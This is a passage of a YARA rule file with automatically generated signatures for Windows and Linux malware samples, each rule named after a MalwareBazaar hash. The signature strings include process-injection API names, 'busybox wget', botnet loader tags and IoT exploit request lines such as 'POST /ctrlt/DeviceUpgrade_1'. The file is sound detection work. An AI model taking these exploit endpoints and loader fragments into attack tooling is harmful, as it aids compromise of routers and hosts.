        $s14 = "System.Collections.Generic"
        $s15 = "System.IO"
        $s16 = "StreamWriter"
        $s17 = "System.Net"
        $s18 = "DownloadData"
        $s19 = "System.Reflection"
        $s20 = "SetTask"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 65KB and
        all of them
}

rule Windows_a204ddc8a7255acf6311bee486d3b64254fa88f1f75a7de88bcf4d8397aaaadb
{
    meta:
        description = "Auto ML: a204ddc8a7255acf6311bee486d3b64254fa88f1f75a7de88bcf4d8397aaaadb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "CreateToolhelp32Snapshot"
        $s8 = "Process32First"
        $s9 = "CloseHandle"
        $s10 = "Process32Next"
        $s11 = "OpenProcess"
        $s12 = "WriteProcessMemory"
        $s13 = "window"
        $s14 = "SimCity.exe"
        $s15 = "CFile"
        $s16 = "CMemFile"
        $s17 = "CTempGdiObject"
        $s18 = "CTempDC"
        $s19 = "CWindowDC"
        $s20 = "CUserException"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 672KB and
        all of them
}

rule Windows_a2081d8d6fd0ce01c305d322633b1a36b3e9f3c54ab4bc7a75411dfe7f3d77b4
{
    meta:
        description = "Auto ML: a2081d8d6fd0ce01c305d322633b1a36b3e9f3c54ab4bc7a75411dfe7f3d77b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_a22a4df8d6f89b8a880e15dc6ee0c197252d8bd70b6b98ddfafcc73f9bc274ba
{
    meta:
        description = "Auto ML: a22a4df8d6f89b8a880e15dc6ee0c197252d8bd70b6b98ddfafcc73f9bc274ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "get_xKvX"
        $s7 = "System.Xml.Schema"
        $s8 = "GetTypedTableSchema"
        $s9 = "ReadXmlSchema"
        $s10 = "WriteXmlSchema"
        $s11 = "GetTypedDataSetSchema"
        $s12 = "System.Data"
        $s13 = "GetSerializationData"
        $s14 = "GetData"
        $s15 = "System.Collections.Generic"
        $s16 = "Read"
        $s17 = "add_Load"
        $s18 = "HomeCarStore_Load"
        $s19 = "SetAdded"
        $s20 = "set_Enabled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 629KB and
        all of them
}

rule Windows_10b71b9870e8b389acdf0874c2d49d392a9d9d227fd37e9f12c290b217f95fc0
{
    meta:
        description = "Auto ML: 10b71b9870e8b389acdf0874c2d49d392a9d9d227fd37e9f12c290b217f95fc0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "user32"
        $s5 = "<Module>"
        $s6 = "CreateCompatibleDC"
        $s7 = "DeleteDC"
        $s8 = "GetDC"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_SizeNWSE"
        $s11 = "get_ukoH"
        $s12 = "get_IsXP"
        $s13 = "get_PathData"
        $s14 = "get_Delta"
        $s15 = "get_IsVista"
        $s16 = "get_SelectedTab"
        $s17 = "set_SelectedTab"
        $s18 = "SetSelectedTab"
        $s19 = "get_HittedTab"
        $s20 = "set_HittedTab"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 903KB and
        all of them
}

rule Linux_a22e3e18da3a7ff50e1079ef579a200f3e5143dbfb6e45d97467e9f4638b9e6c
{
    meta:
        description = "Auto ML: a22e3e18da3a7ff50e1079ef579a200f3e5143dbfb6e45d97467e9f4638b9e6c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "wget-log"
        $s5 = "1337SoraLOADER"
        $s6 = "nloads"
        $s7 = "elfLoad"
        $s8 = "gang123isgodloluaintgettingthesebinslikedammwtf."
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 51KB and
        all of them
}

rule Linux_a27077a912f26f983b7077ae3dcf11c85a508d9eb4cd773cd46797d4784a7110
{
    meta:
        description = "Auto ML: a27077a912f26f983b7077ae3dcf11c85a508d9eb4cd773cd46797d4784a7110"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_a2768ad8cc4dcd602b052d7f129f97eb709f16a5b5857c306e09efd538d7cd6e
{
    meta:
        description = "Auto ML: a2768ad8cc4dcd602b052d7f129f97eb709f16a5b5857c306e09efd538d7cd6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "TRSetO1FqKo4rdNI"
        $s5 = "System.Runtime.Remoting.Metadata"
        $s6 = "System.Collections.Generic"
        $s7 = "Thread"
        $s8 = "GetTypeFromHandle"
        $s9 = "System.Runtime"
        $s10 = "WriteLine"
        $s11 = "get_type"
        $s12 = "set_type"
        $s13 = "System.Core"
        $s14 = "get_SizeSmallestHerbivore"
        $s15 = "set_SizeSmallestHerbivore"
        $s16 = "get_SizeLargestCarnivore"
        $s17 = "set_SizeLargestCarnivore"
        $s18 = "ThreadStaticAttribute"
        $s19 = "MTAThreadAttribute"
        $s20 = "STAThreadAttribute"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 450KB and
        all of them
}

rule Linux_a2abbd6f00cbce6938ebe0c9766280412054364b3df1da504fe47ef527882fe8
{
    meta:
        description = "Auto ML: a2abbd6f00cbce6938ebe0c9766280412054364b3df1da504fe47ef527882fe8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 194KB and
        all of them
}

rule Linux_a2e1ff0cf8173061af6f2e5b25ac02a78714a043d2aeca3dce4169f2ecb85140
{
    meta:
        description = "Auto ML: a2e1ff0cf8173061af6f2e5b25ac02a78714a043d2aeca3dce4169f2ecb85140"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/tmp/tempXXXXXX"
        $s2 = "/proc/self/cmdline"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB and
        all of them
}

rule Linux_a39e5649a4cd0d4c5221d7e4de521cc2da74ee9a685d05ea55a22b5e86b9793d
{
    meta:
        description = "Auto ML: a39e5649a4cd0d4c5221d7e4de521cc2da74ee9a685d05ea55a22b5e86b9793d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Linux_a3dae724f790b6beeafeb1d062400a4fd17bfa733b88bb2eed90540c2f2575b7
{
    meta:
        description = "Auto ML: a3dae724f790b6beeafeb1d062400a4fd17bfa733b88bb2eed90540c2f2575b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB and
        all of them
}

rule Windows_a3e83742c685ef5027595a0a79075b8422f61bb509994550a81a4136f376a6f6
{
    meta:
        description = "Auto ML: a3e83742c685ef5027595a0a79075b8422f61bb509994550a81a4136f376a6f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "gdiplus.dll"
        $s7 = "GdiPlus.dll"
        $s8 = "user32.dll"
        $s9 = "kernel32.dll"
        $s10 = "Kernel32.dll"
        $s11 = "User32.dll"
        $s12 = "msimg32.dll"
        $s13 = "user32"
        $s14 = "Gdiplus.dll"
        $s15 = "UxTheme.dll"
        $s16 = "GdipCreateFontFamilyFromName"
        $s17 = "GdipDeleteFontFamily"
        $s18 = "GdipCreateFont"
        $s19 = "SystemParametersInfoA"
        $s20 = "GdipDeleteFont"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1648KB and
        all of them
}

rule Windows_a3e85675e054df97943915de73ac25572f5bf0b46dbed7b3c17413c44e21f5f7
{
    meta:
        description = "Auto ML: a3e85675e054df97943915de73ac25572f5bf0b46dbed7b3c17413c44e21f5f7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Collections.Concurrent"
        $s6 = "System.Collections.Generic"
        $s7 = "System.Diagnostics"
        $s8 = "System.IO"
        $s9 = "System.Net"
        $s10 = "System.Reflection"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "System.Reflection.Emit"
        $s13 = "ModuleBuilder"
        $s14 = "System.Runtime.CompilerServices"
        $s15 = "System.Runtime.InteropServices"
        $s16 = "TargetFrameworkAttribute"
        $s17 = "System.Runtime.Versioning"
        $s18 = "System.Text"
        $s19 = "System.Threading"
        $s20 = "Thread"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 47KB and
        all of them
}

rule Windows_a4126b3c8ddadad5cc7470f1e967cfe6e2370aec7a20a815ae3ef48b774a22b0
{
    meta:
        description = "Auto ML: a4126b3c8ddadad5cc7470f1e967cfe6e2370aec7a20a815ae3ef48b774a22b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "gSEt"
        $s3 = "kernel32.dll"
        $s4 = "GetModuleHandleA"
        $s5 = "mscoree.dll"
        $s6 = "<!-- Windows Vista -->"
        $s7 = "<!-- Windows 7 -->"
        $s8 = "<!-- Windows 8 -->"
        $s9 = "<!-- Windows 8.1 -->"
        $s10 = "<!-- Windows 10 -->"
        $s11 = "<windowsSettings>"
        $s12 = "<dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware>"
        $s13 = "<dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness>"
        $s14 = "<longPathAware xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">true</longPathAware>"
        $s15 = "</windowsSettings>"
        $s16 = "type=\"win32\""
        $s17 = "name=\"Microsoft.Windows.Common-Controls\""
        $s18 = "processorArchitecture=\"*\""
        $s19 = "TargetiS"
        $s20 = "/get%wlen"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2631KB and
        all of them
}

rule Windows_10fa07a25654e8027da79c6ce9b04e2d41b68d6c7624f510e8251b4b95fd103e
{
    meta:
        description = "Auto ML: 10fa07a25654e8027da79c6ce9b04e2d41b68d6c7624f510e8251b4b95fd103e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Runtime.InteropServices"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.CompilerServices"
        $s9 = "System.Core"
        $s10 = "<Module>"
        $s11 = "System.IO"
        $s12 = "NcYSu0SETn6h8UWjROR"
        $s13 = "<Module>{4EFF3F2A-F8C7-45E3-9056-C59C644C08F5}"
        $s14 = "<Module>{9fa2eeb6-e81a-40d5-945e-50840f51ed72}"
        $s15 = "System.Text"
        $s16 = "System.Collections.Generic"
        $s17 = "System.Linq"
        $s18 = "GetEnumerator"
        $s19 = "get_Current"
        $s20 = "get_Count"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1788KB and
        all of them
}

rule Windows_a46266ddb15dccb8b2a5bb023ae3fe3ca5afc5972559252721eba30d30d7d996
{
    meta:
        description = "Auto ML: a46266ddb15dccb8b2a5bb023ae3fe3ca5afc5972559252721eba30d30d7d996"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB and
        all of them
}

rule Windows_a4725ff36d69bd48e7b489e2d38bdbd72c4275c95c07372efcf4e80a756c77e7
{
    meta:
        description = "Auto ML: a4725ff36d69bd48e7b489e2d38bdbd72c4275c95c07372efcf4e80a756c77e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Whirtles.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_a4b0ee25d1fcedd5c3acb39e5a04a1b3a2e6df417d6522d96e74c1411e80df73
{
    meta:
        description = "Auto ML: a4b0ee25d1fcedd5c3acb39e5a04a1b3a2e6df417d6522d96e74c1411e80df73"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel"
        $s2 = "KERNEL"
        $s3 = "O!.text"
        $s4 = "KERNEL32.DLL"
        $s5 = "LoadLibraryA"
        $s6 = "GetProcAddress"
        $s7 = "ExitProcess"
        $s8 = "http://ocsp.thawte.com0"
        $s9 = ".http://crl.thawte.com/ThawteTimestampingCA.crl0"
        $s10 = "http://ts-ocsp.ws.symantec.com07"
        $s11 = "+http://ts-aia.ws.symantec.com/tss-ca-g2.cer0<"
        $s12 = "+http://ts-crl.ws.symantec.com/tss-ca-g2.crl0("
        $s13 = "http://s2.symcb.com0"
        $s14 = "http://www.symauth.com/cps0("
        $s15 = "http://www.symauth.com/rpa00"
        $s16 = "http://s1.symcb.com/pca3-g5.crl0"
        $s17 = "http://sv.symcb.com/sv.crl0f"
        $s18 = "https://d.symcb.com/cps0%"
        $s19 = "https://d.symcb.com/rpa0"
        $s20 = "http://sv.symcd.com0&"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 121KB and
        all of them
}

rule Linux_a4efa5353fd2e66e4b893d4b3b918d8fca3c9b2ef7c50fb0a99f43a56c9ba053
{
    meta:
        description = "Auto ML: a4efa5353fd2e66e4b893d4b3b918d8fca3c9b2ef7c50fb0a99f43a56c9ba053"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 24KB and
        all of them
}

rule Windows_a50118bac3fb65a828d03e2edb5492112070084f6707527a2fc964cb1ea22623
{
    meta:
        description = "Auto ML: a50118bac3fb65a828d03e2edb5492112070084f6707527a2fc964cb1ea22623"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "AssemblyKeyFileAttribute"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "System.Runtime.InteropServices"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "EKJd.exe"
        $s14 = "<Module>"
        $s15 = "System.Windows.Forms"
        $s16 = "Settings"
        $s17 = "ApplicationSettingsBase"
        $s18 = "System.Configuration"
        $s19 = "<Module>{4BD58FCB-1CB0-4854-A182-B1B33572894B}"
        $s20 = "System.ComponentModel"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 860KB and
        all of them
}

rule Windows_a51a4a7e75a96f9361ab250f68f80d50feedffd76551fc989a2f3966156dc6b4
{
    meta:
        description = "Auto ML: a51a4a7e75a96f9361ab250f68f80d50feedffd76551fc989a2f3966156dc6b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB and
        all of them
}

rule Windows_a52bf253f87035bf054f9ceb9a7296b980537fa478a09b4f1ae000b819ba5e29
{
    meta:
        description = "Auto ML: a52bf253f87035bf054f9ceb9a7296b980537fa478a09b4f1ae000b819ba5e29"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 178KB and
        all of them
}

rule Windows_a55d0d1030b4e204c432033a95ea8a2e3e3b88ec5db13ffca30d185740002df7
{
    meta:
        description = "Auto ML: a55d0d1030b4e204c432033a95ea8a2e3e3b88ec5db13ffca30d185740002df7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "[DEBUG LOG] read_process_memory address < 0xffffff address Returned"
        $s7 = "[DEBUG LOG] read_process_memory address > 0x7fffffff0000 address Returned"
        $s8 = "[DEBUG LOG] write_process_memory address < 0xffffff address Returned"
        $s9 = "[DEBUG LOG] write_process_memory address > 0x7fffffff0000 address Returned"
        $s10 = "[-] call_remote_load_library -> error code : %lu"
        $s11 = "C:\\Users\\wins\\Desktop\\dyg\\project injs\\build\\injector.pdb"
        $s12 = ".text$di"
        $s13 = ".text$mn"
        $s14 = ".text$mn$00"
        $s15 = ".text$x"
        $s16 = ".text$yd"
        $s17 = ".rdata"
        $s18 = ".rdata$r"
        $s19 = ".rdata$voltmd"
        $s20 = ".rdata$zzzdbg"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB and
        all of them
}

rule Windows_a56ab2abe69823efba8192aad89c0521b3869f091752ce63e7ec399f679b1768
{
    meta:
        description = "Auto ML: a56ab2abe69823efba8192aad89c0521b3869f091752ce63e7ec399f679b1768"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetWindowsVersion>g__HKLM_GetString|11_0"
        $s5 = "<GetScanArgs>b__5_0"
        $s6 = "Microsoft.Win32"
        $s7 = "<GetTokens>d__2"
        $s8 = "<Module>"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_ReleaseID"
        $s11 = "set_ReleaseID"
        $s12 = "get_TaskID"
        $s13 = "set_TaskID"
        $s14 = "get_ASCII"
        $s15 = "get_JSON"
        $s16 = "get_ScanVPN"
        $s17 = "set_ScanVPN"
        $s18 = "System.IO"
        $s19 = "get_BlockedIP"
        $s20 = "set_BlockedIP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 95KB and
        all of them
}

rule Windows_a56b22a39525ddd24a449fca6f955fa6618312e93a0e3bdac810eee9efc4616e
{
    meta:
        description = "Auto ML: a56b22a39525ddd24a449fca6f955fa6618312e93a0e3bdac810eee9efc4616e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1180KB and
        all of them
}

rule Windows_1181cfd2b34e7be8a43ea7335ae541ee72c2fb50ab86c1ca0155864965766a55
{
    meta:
        description = "Auto ML: 1181cfd2b34e7be8a43ea7335ae541ee72c2fb50ab86c1ca0155864965766a55"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".reloc"
        $s3 = "<Module>"
        $s4 = "SilverClient.exe"
        $s5 = "Settings"
        $s6 = "RegistryKeyType"
        $s7 = "GetInformationOS"
        $s8 = "Connection"
        $s9 = "MessageRead"
        $s10 = "ReadTools"
        $s11 = "WriteTools"
        $s12 = "System"
        $s13 = "System.Collections"
        $s14 = "ReconnectDelay"
        $s15 = "System.Security.Cryptography.X509Certificates"
        $s16 = "InitializeSettings"
        $s17 = "InternetGetConnectedState"
        $s18 = "System.IO"
        $s19 = "FileInfo"
        $s20 = "CreateShTasks"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 38KB and
        all of them
}

rule Linux_a5aaa929d94c5742bcaf131ece5655978a46646d9ffbd071a64ba8326448f8bb
{
    meta:
        description = "Auto ML: a5aaa929d94c5742bcaf131ece5655978a46646d9ffbd071a64ba8326448f8bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 109KB and
        all of them
}

rule Windows_a5b919aba0810bad117beb62275a94d13a0a0c2961cdf5e3e3202c08b07ea19a
{
    meta:
        description = "Auto ML: a5b919aba0810bad117beb62275a94d13a0a0c2961cdf5e3e3202c08b07ea19a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
